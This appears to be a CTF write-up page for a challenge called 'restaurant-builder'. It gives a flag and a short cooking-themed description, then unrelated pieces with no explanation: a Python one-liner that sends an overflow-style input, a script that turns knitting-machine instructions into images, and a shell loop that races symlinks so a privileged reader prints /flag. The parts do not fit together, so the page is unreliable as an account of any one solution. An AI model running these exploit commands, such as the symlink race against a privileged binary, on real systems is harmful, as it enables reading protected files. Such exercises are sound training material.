title: GPN CTF 2026restaurant-builder
summary: No summary provided for this security writeup.

blocks.content: GPNCTF{WAit, it's NoT juST lUck? NeveR has 833n.}

I always feel like cooking is such a chore...
You have to chop up all your ingredients, cook them for hours and then make the plating look half-decent.But not with this new machine I got!
You just have to put in your recipe (weirdly, the interface calls it a flag...) and it will get cooked for you.
It's so easy, even someone with no experience in cooking reverse engineering can do it.

python3 -c 'import sys; sys.stdout.buffer.write(b"1\n" + b"A"*32 + b"\xff\xff\xff\xff\n0\n")'

#!/usr/bin/env python3

from PIL import Image
import re

KNITOUT_FILE = "pattern.k"
WIDTH = 20

front = set(range(1, WIDTH + 1))
back = set()

bitmap = []

last_dir = None
row_started = False

with open(KNITOUT_FILE, "r") as f:
    for line in f:
        line = line.strip()

        if not line or line.startswith(";"):
            continue

        # Handle transfers
        if line.startswith("xfer"):
            _, src, dst = line.split()

            sbed = src[0]
            snum = int(src[1:])

            dbed = dst[0]
            dnum = int(dst[1:])

            if sbed == "f" and dbed == "b":
                front.discard(snum)
                back.add(dnum)

            elif sbed == "b" and dbed == "f":
                back.discard(snum)
                front.add(dnum)

        # Track carriage passes
        elif line.startswith("knit"):
            parts = line.split()

            direction = parts[1]

            if last_dir is None:
                last_dir = direction

            elif direction != last_dir:
                # Carriage changed direction -> snapshot bed state
                bitmap.append(
                    [1 if n in back else 0 for n in range(1, WIDTH + 1)]
                )

                last_dir = direction

# Add final state
bitmap.append(
    [1 if n in back else 0 for n in range(1, WIDTH + 1)]
)

height = len(bitmap)
width = WIDTH

print(f"[+] Generated bitmap: {width}x{height}")

img = Image.new("L", (width, height))

for y, row in enumerate(bitmap):
    for x, pixel in enumerate(row):
        img.putpixel((x, y), 255 if pixel else 0)

# Save original
img.save("original.png")

# Common CTF orientations
variants = {
    "rot90.png": img.rotate(90, expand=True),
    "rot180.png": img.rotate(180, expand=True),
    "rot270.png": img.rotate(270, expand=True),
    "flip_h.png": img.transpose(Image.FLIP_LEFT_RIGHT),
    "flip_v.png": img.transpose(Image.FLIP_TOP_BOTTOM),
}

for name, variant in variants.items():
    variant.save(name)

# Large preview versions
for name, variant in variants.items():
    variant.resize(
        (variant.width * 8, variant.height * 8),
        Image.NEAREST
    ).save("large_" + name)

img.resize(
    (img.width * 8, img.height * 8),
    Image.NEAREST
).save("large_original.png")

print("[+] Saved:")
print("    original.png")
print("    rot90.png")
print("    rot180.png")
print("    rot270.png")
print("    flip_h.png")
print("    flip_v.png")
print("    large_* versions")

mkdir -p /home/ctf/testdir && echo owned > /home/ctf/testdir/a && ln -sf /home/ctf/testdir/a /home/ctf/testdir/link && (while true; do ln -sf /home/ctf/testdir/a /home/ctf/testdir/link; ln -sf /flag /home/ctf/testdir/link; done) & while true; do /usr/local/bin/supercat /home/ctf/testdir/link 2>/dev/null; done
